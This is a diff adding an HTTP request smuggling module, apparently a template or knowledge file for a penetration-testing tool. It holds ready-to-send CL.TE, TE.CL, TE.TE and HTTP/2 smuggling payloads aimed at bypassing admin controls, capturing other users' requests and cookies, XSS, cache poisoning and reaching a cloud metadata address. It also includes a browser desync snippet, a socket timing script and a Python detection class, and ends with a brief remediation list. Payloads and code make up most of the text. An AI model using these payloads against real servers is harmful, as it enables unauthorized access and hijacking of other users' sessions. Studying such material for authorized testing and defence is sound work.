@@ -1,0 +1,433 @@
+{# HTTP Request Smuggling Module #}
+{# Comprehensive HTTP smuggling attack techniques #}
+
+<http_smuggling_module>
+
+## HTTP REQUEST SMUGGLING GUIDE
+
+### UNDERSTANDING REQUEST SMUGGLING
+
+**What is it?**
+HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers parse HTTP request boundaries, allowing attackers to "smuggle" malicious requests.
+
+**Types:**
+- **CL.TE**: Front-end uses Content-Length, Back-end uses Transfer-Encoding
+- **TE.CL**: Front-end uses Transfer-Encoding, Back-end uses Content-Length
+- **TE.TE**: Both use Transfer-Encoding but handle obfuscation differently
+
+### DETECTION TECHNIQUES
+
+**CL.TE Detection:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+```
+If vulnerable, the "X" causes a timeout or error on the next request.
+
+**TE.CL Detection:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+
+**Timing-Based Detection:**
+```http
+# CL.TE timing test
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+If front-end uses CL and back-end uses TE, the request will hang.
+
+### CL.TE EXPLOITATION
+
+**Basic Smuggling:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+**Request Hijacking:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /admin HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+```
+
+**Capturing Other Users' Requests:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 200
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=attacker
+
+comment=
+```
+The victim's request gets appended to the "comment" parameter.
+
+### TE.CL EXPLOITATION
+
+**Basic Smuggling:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+
+**Admin Access Bypass:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+action=delete&user=admin
+0
+
+
+```
+
+### TE.TE EXPLOITATION (Obfuscation)
+
+**Transfer-Encoding Obfuscation:**
+```http
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: cow
+
+Transfer-Encoding
+ : chunked
+
+Transfer-Encoding: xchunked
+
+Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\r]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+### H2.CL SMUGGLING (HTTP/2)
+
+**Downgrade Attack:**
+```http
+:method: POST
+:path: /
+:authority: target.com
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+
+```
+
+**HTTP/2 Request Tunneling:**
+```http
+:method: POST
+:path: / 
+:authority: target.com
+content-type: application/x-www-form-urlencoded
+content-length: 100
+
+POST /admin HTTP/1.1
+Host: internal.target.com
+Content-Length: 10
+
+x=1
+```
+
+### ATTACK SCENARIOS
+
+**1. Bypass Front-End Controls:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 56
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+X-F: X
+```
+
+**2. Reveal Internal Headers:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+POST /reflect HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+data=
+```
+
+**3. XSS via Smuggling:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Host: target.com
+X-XSS: <script>alert(1)</script>
+
+```
+
+**4. Cache Poisoning:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET /static/file.js HTTP/1.1
+Host: target.com
+X-Inject: malicious_code
+
+```
+
+**5. Internal Network Access:**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: 169.254.169.254
+X-F: X
+```
+
+### CLIENT-SIDE DESYNC
+
+**Browser-Based Smuggling:**
+```javascript
+fetch('https://target.com/', {
+    method: 'POST',
+    body: "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+    mode: 'cors',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'text/plain'
+    }
+});
+```
+
+**Pause-Based Desync:**
+```python
+import socket
+import time
+
+s = socket.socket()
+s.connect(('target.com', 80))
+
+# Send first part
+s.send(b"POST / HTTP/1.1\r\n")
+s.send(b"Host: target.com\r\n")
+s.send(b"Content-Length: 100\r\n\r\n")
+
+# Pause to trigger timeout
+time.sleep(60)
+
+# Send smuggled request
+s.send(b"GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n")
+```
+
+### AUTOMATION SCRIPT
+
+```python
+#!/usr/bin/env python3
+"""
+HTTP Request Smuggling Detection Script
+"""
+
+import socket
+import ssl
+import time
+
+class SmugglingTester:
+    def __init__(self, host, port=443, use_ssl=True):
+        self.host = host
+        self.port = port
+        self.use_ssl = use_ssl
+    
+    def _send_request(self, data, timeout=10):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        
+        if self.use_ssl:
+            context = ssl.create_default_context()
+            sock = context.wrap_socket(sock, server_hostname=self.host)
+        
+        sock.connect((self.host, self.port))
+        sock.send(data)
+        
+        start = time.time()
+        response = b""
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+        except socket.timeout:
+            pass
+        
+        elapsed = time.time() - start
+        sock.close()
+        return response, elapsed
+    
+    def test_cl_te(self):
+        """Test for CL.TE vulnerability."""
+        # Normal request timing
+        normal = b"POST / HTTP/1.1\r\n"
+        normal += f"Host: {self.host}\r\n".encode()
+        normal += b"Content-Length: 4\r\n\r\ntest"
+        _, normal_time = self._send_request(normal)
+        
+        # CL.TE test request
+        test = b"POST / HTTP/1.1\r\n"
+        test += f"Host: {self.host}\r\n".encode()
+        test += b"Content-Length: 6\r\n"
+        test += b"Transfer-Encoding: chunked\r\n\r\n"
+        test += b"0\r\n\r\nX"
+        
+        _, test_time = self._send_request(test, timeout=15)
+        
+        if test_time > normal_time + 5:
+            print(f"[+] CL.TE VULNERABLE! Timing: {test_time:.2f}s")
+            return True
+        return False
+    
+    def test_te_cl(self):
+        """Test for TE.CL vulnerability."""
+        test = b"POST / HTTP/1.1\r\n"
+        test += f"Host: {self.host}\r\n".encode()
+        test += b"Content-Length: 4\r\n"
+        test += b"Transfer-Encoding: chunked\r\n\r\n"
+        test += b"5c\r\n"
+        test += b"GPOST / HTTP/1.1\r\n"
+        test += b"Content-Length: 15\r\n\r\n"
+        test += b"x=1\r\n"
+        test += b"0\r\n\r\n"
+        
+        response, _ = self._send_request(test)
+        
+        if b"GPOST" in response or b"Invalid" in response:
+            print("[+] TE.CL VULNERABLE!")
+            return True
+        return False
+
+if __name__ == "__main__":
+    import sys
+    tester = SmugglingTester(sys.argv[1])
+    tester.test_cl_te()
+    tester.test_te_cl()
+```
+
+### TOOLS
+
+- **smuggler** - Python smuggling scanner
+- **http-request-smuggling** - Burp extension
+- **h2csmuggler** - HTTP/2 smuggling
+
+### REMEDIATION
+
+- [ ] Use HTTP/2 end-to-end (avoid downgrade)
+- [ ] Configure servers to reject ambiguous requests
+- [ ] Normalize Content-Length and Transfer-Encoding handling
+- [ ] Use same server software for front-end and back-end
+- [ ] Disable HTTP/1.1 keep-alive
+- [ ] Implement strict request parsing
+
+</http_smuggling_module>
